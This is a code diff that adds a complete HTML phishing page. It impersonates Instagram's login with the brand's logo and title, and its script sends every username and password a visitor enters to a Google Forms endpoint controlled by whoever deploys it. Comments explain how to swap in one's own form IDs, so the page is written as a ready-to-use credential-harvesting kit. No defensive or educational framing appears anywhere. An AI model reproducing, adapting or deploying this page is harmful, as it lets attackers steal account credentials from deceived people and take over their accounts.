@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; }
+        .login-box { background: linear-gradient(to right, #E1306C, #FD1D1D); padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        input[type="text"], input[type="password"] { width: 80%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; border-radius: 8px; }
+        button { background-color: blue; color: green; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 50%; }
+        button:hover { opacity: 0.8; }
+        h2 {
+  /* 1. Create the gradient background */
+  background: linear-gradient(to right, #f9ce34, #ee2a7b, #6228d7);
+  
+  /* 2. Clip the background to the text's shape */
+  -webkit-background-clip: text;  /* For Safari/Chrome */
+  background-clip: text;
+  
+  /* 3. Make the text color transparent so the background shows through */
+  color: transparent;
+}
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2><img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
+       style="height: 30px; margin-right: 10px;">INSTAGRAM</h2>
+    <form id="loginForm">
+        <label for="username"><b>Username</b></label>
+        <input type="text" placeholder="Enter Username" name="username" id="username" required>
+
+        <label for="password"><b>Password</b></label>
+        <input type="password" placeholder="Enter Password" name="password" id="password" required>
+		<p class="forgot-pwd"><a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password</a></p>
+
+        <button type="submit">Submit and verify</button>
+        <p id="message" style="color: linear-gradient(to right, #E1306C, #FD1D1D);"></p>
+    </form>
+</div>
+
+<script>
+    // 💡 IMPORTANT: Replace these placeholders with your actual IDs and URL
+    const USERNAME_ID = 'entry.1232812997'; // <--- REPLACE THIS
+    const PASSWORD_ID = 'entry.37381148'; // <--- REPLACE THIS
+    const FORM_ACTION_URL = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdGKwVab2y7fnZdIodOyuTydPoHFsh-LtabdVOBOFsjSqQ-MQ/formResponse'; // <--- REPLACE 'YOUR_FORM_KEY'
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent the default form submission
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        // Construct the data payload using the Google Form entry IDs
+        const data = {
+            [USERNAME_ID]: username,
+            [PASSWORD_ID]: password
+        };
+
+        const formBody = new URLSearchParams();
+        for (let key in data) {
+            formBody.append(key, data[key]);
+        }
+
+        fetch(FORM_ACTION_URL, {
+            method: 'POST',
+            mode: 'no-cors', // Essential for submitting to Google Forms from an external site
+            body: formBody
+        })
+        .then(() => {
+            document.getElementById('message').textContent = 'Credentials submitted successfully!';
+            // You can redirect the user or perform the actual login action here
+            // window.location.href = 'https://your-actual-app.com/dashboard';
+        })
+        .catch(error => {
+            console.error('Error submitting form:', error);
+            document.getElementById('message').textContent = 'An error occurred during submission.';
+        });
+    });
+</script>
+
+</body>
+</html>
